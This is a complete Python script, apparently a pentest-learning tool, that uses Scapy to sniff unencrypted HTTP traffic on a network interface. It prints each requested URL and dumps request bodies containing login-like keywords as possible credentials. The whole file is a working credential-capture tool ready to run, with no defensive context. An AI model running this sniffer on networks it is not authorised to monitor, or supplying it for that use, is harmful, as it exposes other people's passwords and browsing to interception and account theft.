#!/usr/bin/env python3
# packet_sniffer.py
"""HTTP Packet sniffing using Python3 and ScaPy"""

import sys
import argparse
try:
    import scapy.all as sp
    from scapy.layers.http import HTTPRequest
except ModuleNotFoundError:
    print('Please install the dependencies: ScaPy')
    print('Run: sudo python3 -m pip install scapy[complete]')
    sys.exit(0)


def set_arguments(p):
    # Setting options for command line arguments
    p.add_argument('-i', '--interface', dest='interface', help='Network interface to run the sniffer. e.g.: eth0, wlan0')


def get_arguments(p):
    # Parsing the command line arguments and returning the arguments
    arguments = p.parse_args()
    if arguments.interface is None:
        p.error(f'Please specify a network interface. Type {sys.argv[0]} -h for more info.')
    else:
        return arguments


def get_url(packet):
    # Function to extract the URL and Path from the HTTP Request
    url_byte = packet[HTTPRequest].Host + packet[HTTPRequest].Path
    # Converting the bytes type output to string in UTF-8 format.
    return url_byte.decode('utf-8')


def get_login(packet):
    # Function to extract the part of the packet that contains possible login credentials
    # If the packet has a RAW layer
    if packet.haslayer(sp.Raw):
        # Decode the RAW layer and search for possible keywords for credentials.
        load = packet[sp.Raw].load.decode('utf-8')
        keywords = ('username', 'user', 'login', 'pass', 'password', 'Login', 'Password', 'Sign', 'sign', 'l', 'p')
        if any(key in load for key in keywords):
            return load


def process_pkt(packet):
    if packet.haslayer(HTTPRequest):
        # If the packet has an HTTP Request Layer
        # Extract the URL and check for possible credentials
        url = get_url(packet)
        print('[+] URL:', url)
        creds = get_login(packet)
        if creds is not None:
            print('\n************* Possible Credentials *************')
            print(creds)
            print('************************************************\n')


def sniff(interface):
    print(f'[+] Running sniffer on network interface {interface}...')
    print('[+] Press CRTL + C to exit.')
    sp.sniff(iface=interface, store=False, prn=process_pkt)


if __name__ == '__main__':
    parser = argparse.ArgumentParser()  # ArgumentParser() class to parse the command line arguments
    set_arguments(parser)
    # Getting the command line arguments
    args = get_arguments(parser)
    try:
        sniff(args.interface)
    except PermissionError:
        print('[!] Please run the script as root.')
    except OSError:
        print('[!] No such interface on this device.')
